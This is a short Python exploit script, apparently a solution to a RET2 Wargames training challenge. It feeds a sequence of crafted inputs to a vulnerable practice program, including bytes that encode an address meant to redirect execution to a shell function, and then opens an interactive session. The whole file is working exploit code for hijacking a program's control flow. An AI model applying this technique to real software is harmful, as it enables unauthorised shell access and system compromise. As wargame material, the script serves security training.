#This is specifically written to work in the RET2 Wargames
#interactive enviornment.

import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
for _ in range(7):
    if _ < 5:
        data = p.readuntil('\n')
        p.sendline('hello')
    elif _ == 5:
        data = p.readuntil('\n')
        p.sendline('cyber')
    else:
        data = p.readuntil('\n')
        p.sendline('\x29\x29\x29\x29\x29')

data = p.readuntil('\n')
p.sendline('AAAAA')
data = p.readuntil('\n')
p.sendline('BBBBB')
data = p.readuntil('\n')
p.sendline('CCCCC')
data = p.readuntil('\n')
p.sendline('DDDDÃ»')         #start sending encoded address
data = p.readuntil('\n')    #to call the shell function
p.sendline('$i)))')         #finished address
data = p.readuntil('\n')
p.sendline('))FFF')

data = p.readuntil('\n')
p.sendline('cyber')


p.interactive()